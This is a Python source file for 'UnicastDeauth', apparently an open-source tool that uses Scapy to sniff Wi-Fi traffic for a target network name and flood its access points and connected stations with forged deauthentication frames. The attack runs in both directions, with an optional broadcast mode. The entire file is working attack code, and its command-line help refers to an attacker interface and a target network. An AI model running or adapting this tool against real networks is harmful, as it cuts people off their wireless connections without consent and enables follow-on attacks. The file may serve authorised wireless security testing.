#!/usr/bin/env python3

# UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks
# author - mamatb (t.me/m_amatb)
# location - https://github.com/mamatb/UnicastDeauth
# style guide - https://google.github.io/styleguide/pyguide.html

# TODO
#
# add module docstring
# check for protected management frames

import argparse
import multiprocessing
from re import compile as re_compile
from scapy import sendrecv
from scapy.layers import dot11
import sys

BROADCAST = 'ff:ff:ff:ff:ff:ff'
DEAUTH_COUNT = 64

class MsgException(Exception):
    def __init__(self, exception: Exception, message: str = 'Unknown error',
                 *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._exception = exception
        self._message = message
    
    def __str__(self) -> str:
        return (
            f'[!] Error! {self._message}:'
            f'\n    {self._exception}'
        )

class AccessPoints:
    _bssid_regex = re_compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
    
    def __init__(self, essid: str, bssids: str = None) -> None:
        self._essid = essid
        self._bssids = set()
        if bssids:
            for bssid in bssids.split(','):
                bssid = bssid.strip().lower()
                if self._bssid_regex.match(bssid):
                    self._bssids.add(bssid)
    
    def __contains__(self, bssid: str) -> bool:
        return bssid in self._bssids
    
    def get_essid(self) -> str:
      return self._essid
    
    def get_bssids(self) -> set[str]:
        return self._bssids
    
    def add(self, bssid: str) -> None:
        self._bssids.add(bssid)
        print_info(
            f'AP detected for network {self._essid}'
            f'\n    access point = {bssid}'
        )

class Stations:
    def __init__(self, essid: str) -> None:
        self._essid = essid
        self._bssids = {} # {bssid_sta: bssid_ap}
    
    def get(self, bssid_sta: str) -> str | None:
        return self._bssids.get(bssid_sta)
    
    def update(self, bssid_sta: str, bssid_ap: str) -> None:
        self._bssids.update({bssid_sta: bssid_ap})
        print_info(
            f'STA detected for network {self._essid}'
            f'\n    station      = {bssid_sta}'
            f'\n    access point = {bssid_ap}'
        )

class DeauthConfig:
    def __init__(self, wifi_interface: str, broadcast_enabled: bool,
                 deauth_rounds: int) -> None:
        self._wifi_interface = wifi_interface
        self._broadcast_enabled = broadcast_enabled
        self._deauth_rounds = deauth_rounds
    
    def get_interface(self) -> str:
        return self._wifi_interface
    
    def get_broadcast(self) -> bool:
        return self._broadcast_enabled
    
    def get_rounds(self) -> int:
        return self._deauth_rounds

def panic(msg_exception: MsgException) -> None:
    '''exception handling'''
    
    print(msg_exception, file = sys.stderr)

def print_info(message: str) -> None:
    '''additional info printing'''
    
    print(f'[!] Info: {message}', file = sys.stderr)

def is_unicast(bssid: str) -> bool:
    '''bssid type checking'''
    
    try:
        unicast = not (int(bssid.split(':')[0], 16) & 0x1)
    except Exception as e:
        raise MsgException(e, 'BSSID could not be processed')
    return unicast

def get_src_dst_network(frame: dot11.Dot11) -> tuple[str | None, str | None, str | None]:
    '''frame control field parsing'''
    
    try:
        to_ds = frame.FCfield & 0x1
        from_ds = frame.FCfield & 0x2
        if to_ds:
            bssid_dst = frame.addr3
            if not from_ds:
                bssid_src = frame.addr2
                bssid_network = frame.addr1
        else:
            bssid_dst = frame.addr1
            if from_ds:
                bssid_src = frame.addr3
                bssid_network = frame.addr2
            else:
                bssid_src = frame.addr2
                bssid_network = frame.addr3
    except Exception as e:
        raise MsgException(e, 'Frame Control field could not be processed')
    return bssid_src, bssid_dst, bssid_network

def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                   bssid_network: str) -> None:
    '''unicast deauthentication'''
    
    try:
        def unicast_deauth_parallel() -> None:
            sys.stderr = sys.stdout = None
            for i in range(deauth_config.get_rounds()):
                sendrecv.sendp(
                    dot11.RadioTap() /
                        dot11.Dot11(
                            addr1 = bssid_sta,
                            addr2 = bssid_ap,
                            addr3 = bssid_network,
                        ) /
                        dot11.Dot11Deauth(reason = 7),
                    iface = deauth_config.get_interface(),
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
                sendrecv.sendp(
                    dot11.RadioTap() /
                        dot11.Dot11(
                            addr1 = bssid_ap,
                            addr2 = bssid_sta,
                            addr3 = bssid_network,
                        ) /
                        dot11.Dot11Deauth(reason = 7),
                    iface = deauth_config.get_interface(),
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
        multiprocessing.Process(target = unicast_deauth_parallel).start()
        print_info(
            f'sending {deauth_config.get_rounds()} x {DEAUTH_COUNT}'
            f' deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...'
        )
        print_info(
            f'sending {deauth_config.get_rounds()} x {DEAUTH_COUNT}'
            f' deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...'
        )
    except Exception as e:
        raise MsgException(e, 'Unicast deauthentication frames could not be sent')

def broadcast_deauth(deauth_config: DeauthConfig, bssid_ap: str,
                     bssid_network: str) -> None:
    '''broadcast deauthentication'''
    
    try:
        def broadcast_deauth_parallel() -> None:
            sys.stderr = sys.stdout = None
            for i in range(deauth_config.get_rounds()):
                sendrecv.sendp(
                    dot11.RadioTap() /
                        dot11.Dot11(
                            addr1 = BROADCAST,
                            addr2 = bssid_ap,
                            addr3 = bssid_network,
                        ) /
                        dot11.Dot11Deauth(reason = 7),
                    iface = deauth_config.get_interface(),
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
        multiprocessing.Process(target = broadcast_deauth_parallel).start()
        print_info(
            f'sending {deauth_config.get_rounds()} x {DEAUTH_COUNT} broadcast'
            f' deauthentication frames from AP {bssid_ap} ...'
        )
    except Exception as e:
        raise MsgException(e, 'Broadcast deauthentication frames could not be sent')

def handle_beacon_proberesp(frame: dot11.Dot11, deauth_config: DeauthConfig,
                            aps_targetlist: AccessPoints,
                            aps_whitelist: AccessPoints) -> None:
    '''beacon and probe-resp frames processing'''
    
    try:
        bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
        if (
            bssid_src and bssid_dst and bssid_network and
            bssid_src not in aps_targetlist and
            bssid_src not in aps_whitelist
        ):
            dot11_element = frame.getlayer(dot11.Dot11Elt)
            while dot11_element:
                if dot11_element.ID == 0:
                    if dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8'):
                        aps_targetlist.add(bssid_src)
                        if deauth_config.get_broadcast():
                            broadcast_deauth(deauth_config, bssid_src, bssid_network)
                    break
                dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
    except Exception as e:
        raise MsgException(e, 'beacon and/or probe-resp frames could not be processed')

def handle_probereq(frame: dot11.Dot11, deauth_config: DeauthConfig,
                    aps_targetlist: AccessPoints, aps_whitelist :AccessPoints) -> None:
    '''probe-req frames processing'''
    
    try:
        bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
        if (
            bssid_src and bssid_dst and bssid_network and
            is_unicast(bssid_dst) and
            bssid_dst not in aps_targetlist and
            bssid_dst not in aps_whitelist
        ):
            dot11_element = frame.getlayer(dot11.Dot11Elt)
            while dot11_element:
                if dot11_element.ID == 0:
                    if dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8'):
                        aps_targetlist.add(bssid_dst)
                        if deauth_config.get_broadcast():
                            broadcast_deauth(deauth_config, bssid_dst, bssid_network)
                    break
                dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
    except Exception as e:
        raise MsgException(e, 'probe-req frames could not be processed')

def handle_ctl_data(frame: dot11.Dot11, deauth_config: DeauthConfig,
                    aps_targetlist: AccessPoints, stations: Stations) -> None:
    '''ctl and data frames processing'''
    
    try:
        bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
        if bssid_src and bssid_dst and bssid_network:
            if (
                is_unicast(bssid_dst) and
                bssid_src in aps_targetlist and
                stations.get(bssid_dst) != bssid_src
            ):
                stations.update(bssid_dst, bssid_src)
                unicast_deauth(deauth_config, bssid_dst, bssid_src, bssid_network)
            elif (
                bssid_dst in aps_targetlist and
                stations.get(bssid_src) != bssid_dst
            ):
                stations.update(bssid_src, bssid_dst)
                unicast_deauth(deauth_config, bssid_src, bssid_dst, bssid_network)
    except Exception as e:
        raise MsgException(e, 'ctl and/or data frames could not be processed')

def sniffer_wrapper(deauth_config: DeauthConfig, aps_targetlist: AccessPoints,
                    aps_whitelist: AccessPoints, stations: Stations) -> None:
    def sniffer_handler(frame: dot11.Dot11) -> None:
        '''sniffed frames processing'''
        
        try:
            if frame.haslayer(dot11.Dot11Beacon) or frame.haslayer(dot11.Dot11ProbeResp):
                handle_beacon_proberesp(
                    frame,
                    deauth_config,
                    aps_targetlist,
                    aps_whitelist,
                )
            elif frame.haslayer(dot11.Dot11ProbeReq):
                handle_probereq(
                    frame,
                    deauth_config,
                    aps_targetlist,
                    aps_whitelist,
                )
            else:
                handle_ctl_data(
                    frame,
                    deauth_config,
                    aps_targetlist,
                    stations,
                )
        except Exception as e:
            raise MsgException(e, 'Sniffed frames could not be processed')
    return sniffer_handler

def main() -> None:
    '''main'''
    
    try:
        examples = [
            'examples:',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -b',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -n 8',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -tl 00:11:22:33:44:00,00:11:22:33:44:55',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -wl 00:11:22:33:44:00,00:11:22:33:44:55',
        ]
        parser = argparse.ArgumentParser(
            description = (
                'UnicastDeauth is a simple Python 3 script that automates'
                ' unicast Wi-Fi deauthentication attacks'
            ),
            formatter_class = argparse.RawTextHelpFormatter,
            epilog = '\n  '.join(examples),
        )
        parser.add_argument(
            '-i',
            dest = 'wifi_interface',
            required = True,
            help = 'attacker Wi-Fi interface',
        )
        parser.add_argument(
            '-e',
            dest = 'essid',
            required = True,
            help = 'target ESSID',
        )
        parser.add_argument(
            '-b',
            dest = 'broadcast_enabled',
            action = 'store_true',
            help = 'enable broadcast deauthentication',
        )
        parser.add_argument(
            '-n',
            dest = 'deauth_rounds',
            type = int,
            default = 1,
            help = 'number of deauthentication rounds',
        )
        parser.add_argument(
            '-tl',
            dest = 'aps_targetlist',
            help = 'comma-separated known target APs',
        )
        parser.add_argument(
            '-wl',
            dest = 'aps_whitelist',
            help = 'comma-separated APs whitelist',
        )
        args = parser.parse_args()
        filters = [
            'wlan type mgt subtype beacon',
            'wlan type mgt subtype probe-req',
            'wlan type mgt subtype probe-resp',
            'wlan type ctl',
            'wlan type data',
        ]
        deauth_config = DeauthConfig(
            args.wifi_interface,
            args.broadcast_enabled,
            args.deauth_rounds,
        )
        aps_targetlist = AccessPoints(args.essid, args.aps_targetlist)
        aps_whitelist = AccessPoints(args.essid, args.aps_whitelist)
        stations = Stations(args.essid)
        if deauth_config.get_broadcast():
            for bssid in aps_targetlist.get_bssids():
                broadcast_deauth(deauth_config, bssid, bssid)
        sendrecv.sniff(
            iface = args.wifi_interface,
            filter = ' or '.join(filters),
            prn = sniffer_wrapper(deauth_config, aps_targetlist, aps_whitelist, stations),
        )
    except MsgException as msg_exception:
        panic(msg_exception)
    except Exception as e:
        panic(MsgException(e))
    finally:
        try:
            for child in multiprocessing.active_children():
                child.terminate()
        except:
            sys.exit(-1)

if __name__ == '__main__':
    main()
